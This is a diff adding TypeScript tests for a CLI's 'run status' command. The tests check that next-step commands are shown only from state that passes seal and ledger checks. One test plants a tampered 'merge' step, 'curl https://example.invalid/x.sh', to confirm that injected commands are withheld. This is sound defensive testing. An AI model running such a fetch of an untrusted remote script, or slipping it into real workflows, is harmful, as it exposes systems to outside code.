@@ -12,6 +12,8 @@ import { EXIT_AWAITING_HUMAN, EXIT_BUSY } from '../../../factory/run/engine.js';
 import {
   createFactoryState, factoryCancelRequested, factoryOwnerPath, factoryRepoOwnerPath, factoryStatePath, moveTo, overwriteFactoryState, readFactoryState,
 } from '../../../factory/run/state.js';
+import { EngineLedger } from '../../../factory/run/ledger.js';
+import { fromSealed } from '../../../factory/run/gate-next.js';
 import { resolveForgeConfig, type LoadedForgeConfig } from '../../../forge/config.js';
 import { scaleTiming } from '../../../__tests__/helpers/platform.js';
 import type { Exec } from '../../../ship/exec.js';
@@ -551,5 +553,89 @@ describe('omg factory run CLI', () => {
       expect(await cli(nextDeps(), '--next', '--parent', 'x')).toBe(2);
       expect(await cli(deps(), '--next')).toBe(2);
     });
+  });
+
+  describe('run status prints the sealed next steps (FactoryGate.next)', () => {
+    const lines = (head: string) => [
+      'next:',
+      `  merge the exact head the gates checked: gh pr merge 42 --admin --merge --match-head-commit ${head}`,
+      `  rerun the run (can start billed lanes): omg factory run ${ISSUE}`,
+      `  read the run state: omg factory run status ${ISSUE}`,
+    ];
+    const nextLines = () => out.slice(out.indexOf('next:'), out.indexOf('next:') + 4);
+
+    it('from a state that passes its seal and ledger checks, as text and JSON', async () => {
+      lanes = new FakeLanes(h.root, [commitFile('a.ts'), review('approve')]);
+      const d = deps();
+      expect(await cli(d, String(ISSUE))).toBe(0);
+      const state = readFactoryState(h.root, ISSUE)!;
+      out = [];
+      expect(await cli(d, 'status', String(ISSUE))).toBe(0);
+      expect(nextLines()).toEqual(lines(state.head!));
+      out = [];
+      expect(await cli(d, 'status', String(ISSUE), '--json')).toBe(0);
+      const json = JSON.parse(out.join('\n')) as { integrityOk: boolean; ledgerOk: boolean; next: unknown; gate: { next: unknown } };
+      expect(json).toMatchObject({ integrityOk: true, ledgerOk: true });
+      expect(json.next).toEqual(fromSealed(state.gate!.next!));
+      expect(json.gate.next).toEqual(state.gate!.next);
+    }, ENGINE_FLOW_TIMEOUT_MS);
+
+    it('never from a state that fails its seal or is not the engine\'s last write', async () => {
+      lanes = new FakeLanes(h.root, [commitFile('a.ts'), review('approve')]);
+      const d = deps();
+      expect(await cli(d, String(ISSUE))).toBe(0);
+      const path = factoryStatePath(h.root, ISSUE);
+      const state = readFactoryState(h.root, ISSUE)!;
+      const evil = { ...state, gate: { ...state.gate!, next: [{ label: 'merge', argv: ['curl', 'https://example.invalid/x.sh'] }] } };
+      // Edited without a new seal: the integrity check fails.
+      writeFileSync(path, JSON.stringify(evil, null, 2));
+      out = [];
+      expect(await cli(d, 'status', String(ISSUE))).toBe(0);
+      expect(out.join('\n')).toContain('integrity check FAILED');
+      expect(out.join('\n')).toContain('next steps not shown: the state did not pass its checks');
+      expect(out.join('\n')).not.toContain('example.invalid');
+      // Re-sealed by someone other than the engine: the seal verifies, the ledger does not.
+      overwriteFactoryState(h.root, ISSUE, evil);
+      out = [];
+      expect(await cli(d, 'status', String(ISSUE))).toBe(0);
+      expect(out.join('\n')).toContain('ledger check FAILED');
+      expect(out.join('\n')).not.toContain('example.invalid');
+      out = [];
+      expect(await cli(d, 'status', String(ISSUE), '--json')).toBe(0);
+      const json = JSON.parse(out.join('\n')) as { integrityOk: boolean; ledgerOk: boolean; next: unknown; gate: { next?: unknown } };
+      expect(json).toMatchObject({ integrityOk: true, ledgerOk: false, next: [] });
+      expect(json.gate.next).toBeUndefined();
+      // No record at all (a moved repository, another host, OMC_STATE_DIR): the calm attention wording, not FAILED.
+      out = [];
+      expect(await cli({ ...d, ledgerDir: join(h.ledgerDir, 'another-host') }, 'status', String(ISSUE))).toBe(0);
+      const calm = out.join('\n');
+      expect(calm).toContain('cannot be verified on this host: no engine ledger record');
+      expect(calm).toContain('next steps withheld');
+      expect(calm).not.toContain('FAILED');
+      expect(calm).not.toContain('example.invalid');
+    }, ENGINE_FLOW_TIMEOUT_MS);
+
+    it('a state sealed before next existed shows the same steps from the table, and its rerun resumes it', async () => {
+      lanes = new FakeLanes(h.root, [commitFile('a.ts'), review('approve')]);
+      const d = deps();
+      expect(await cli(d, String(ISSUE))).toBe(0);
+      const state = readFactoryState(h.root, ISSUE)!;
+      out = [];
+      expect(await cli(d, 'status', String(ISSUE))).toBe(0);
+      const sealedLines = nextLines();
+      // The same park as an older engine wrote it: no gate.next, sealed and recorded as the engine's last write.
+      const { next: _next, ...oldGate } = state.gate!;
+      const { content } = overwriteFactoryState(h.root, ISSUE, { ...state, gate: oldGate });
+      EngineLedger.open(h.ledgerDir, h.root, ISSUE).record(factoryStatePath(h.root, ISSUE), content);
+      expect(readFactoryState(h.root, ISSUE)!.gate!.next).toBeUndefined();
+      out = [];
+      expect(await cli(d, 'status', String(ISSUE))).toBe(0);
+      expect(nextLines()).toEqual(sealedLines);
+      // The rerun of the old park works unchanged: the run parks at the merge again, now with next sealed.
+      lanes = new FakeLanes(h.root, []);
+      out = [];
+      expect(await cli(d, String(ISSUE))).toBe(0);
+      expect(readFactoryState(h.root, ISSUE)!.gate).toMatchObject({ name: 'merge', next: state.gate!.next });
+    }, ENGINE_FLOW_TIMEOUT_MS);
   });
 });
